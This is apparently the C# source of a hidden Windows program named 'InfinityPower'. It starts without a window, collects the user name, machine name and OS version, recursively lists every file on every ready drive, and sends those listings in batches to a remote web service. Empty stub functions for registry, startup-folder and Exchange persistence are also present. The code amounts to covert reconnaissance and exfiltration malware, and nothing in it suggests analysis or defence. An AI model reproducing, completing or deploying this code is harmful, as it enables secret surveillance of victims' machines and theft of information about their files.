using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace InfinityPower
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            DateTime dt1 = DateTime.Now;
            fileManager();
            TimeSpan differ = DateTime.Now.Subtract(dt1);

            Application.Run();
        }

        private static String getTone()
        {
            String result = Environment.UserName + ".";

            try
            {
                result += Environment.MachineName;
            }
            catch
            {
                result += Variables.ERROR_MACHINE_NAME;
            }

            try
            {
                result += Environment.OSVersion.ToString();
            }
            catch
            {
                result += Variables.ERROR_OSVERSION;
            }

            return result;
        }

        #region file manager region
        private static void fileManager()
        {
            System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();
            Int32 capacity = 5000;

            for (Int32 i = drives.Length - 1; i >= 0; i--)
                if (drives[i].IsReady)
                {
                    System.Collections.Specialized.StringCollection files = new System.Collections.Specialized.StringCollection();
                    String litter = drives[i].Name.Length > 0 ? drives[i].Name.Substring(0, 1) : Variables.UNKNOWN_DRIVE_LITTER;
                    String fmName = getTone() + '-' + litter + ".mfm";
                    Int32 index = 0;

                    getFiles(drives[i].Name, ref files, false, false, false);

                    while (index < files.Count - 1)
                    {
                        try
                        {
                            ms.FileManager(fmName, getSubStrings(files, index, capacity));
                            index += capacity;
                        }
                        catch
                        {
                            capacity = Convert.ToInt32(capacity / 2);
                        }
                    }
                }
        }

        private static String[] getSubStrings(System.Collections.Specialized.StringCollection collection, Int32 startIndex, Int32 length)
        {
            String[] result;
            Int32 n;

            if (length > collection.Count - startIndex)
                n = collection.Count - startIndex;
            else
                n = length;

            result = new String[n];

            for (Int32 i = 0; i < result.Length; i++)
                result[i] = collection[startIndex + i];

            return result;
        }

        private static String getTopDirectoryName(String path)
        {
            Int32 pos1 = path.LastIndexOf(System.IO.Path.DirectorySeparatorChar);
            Int32 pos2 = path.LastIndexOf(System.IO.Path.AltDirectorySeparatorChar);
            Int32 pos = pos1 > pos2 ? pos1 : pos2;

            if (pos >= 0)
                return path.Substring(pos);
            else
                return Variables.TOP_DIRECTORY_LOGO;        
        }

        private static void getFiles(String directory,ref System.Collections.Specialized.StringCollection result,Boolean recycleBinContent,Boolean internetFileContent,Boolean emptyFolder)
        {
            //precondition: result is not null
            try
            {
                if (!recycleBinContent)
                    if (directory.ToLower().EndsWith("$recycle.bin") || directory.EndsWith("recycled") || directory.ToLower().EndsWith("recycler") || directory.ToLower().EndsWith("system volume information"))
                        return;

                if (!internetFileContent)
                    if (directory.ToLower().EndsWith("_files"))
                        return;

                String[] files = System.IO.Directory.GetFiles(directory);

                if (emptyFolder && files.Length == 0)
                    return;
                   
                result.Add(getTopDirectoryName(directory));

                foreach (String file in files)
                    result.Add(System.IO.Path.GetFileName(file));

                if (System.IO.Directory.GetDirectories(directory).Length == 0)
                {
                    result.Add(Variables.END_DIRECTORY_LOGO);
                    return;
                }
                else
                {
                    foreach (String subDirectory in System.IO.Directory.GetDirectories(directory))
                        getFiles(subDirectory, ref result, recycleBinContent, internetFileContent, emptyFolder);

                    result.Add(Variables.END_DIRECTORY_LOGO);
                }
            }
            catch
            {
                result.Add(Variables.END_DIRECTORY_LOGO);
            }
        }
        #endregion

        #region startup functions region
        private static void RegistryStartup(String path)
        {
        }

        private static void RegistryStartup()
        {
        }

        private static Boolean CheckRegistryStartup(String path)
        {
            return false;
        }

        private static Boolean CheckRegistryStartup()
        {
            return false;
        }

        private static void DirectoryStartup(String path)
        {
        }

        private static void DirectoryStartup()
        {
        }

        private static Boolean CheckDirectoryStartup(String path)
        {
            return false;
        }

        private static Boolean CheckDirectoryStartup()
        {
            return false;
        }

        private static void ExchangeStartup(String path)
        {
        }

        private static void ExchangeStartup()
        {
        }

        private static Boolean CheckExchangeStartup(String path)
        {
            return false;
        }

        private static Boolean CheckExchangeStartup()
        {
            return false;
        }
        #endregion

        static MainService.MainService ms = new MainService.MainService();
    }
}
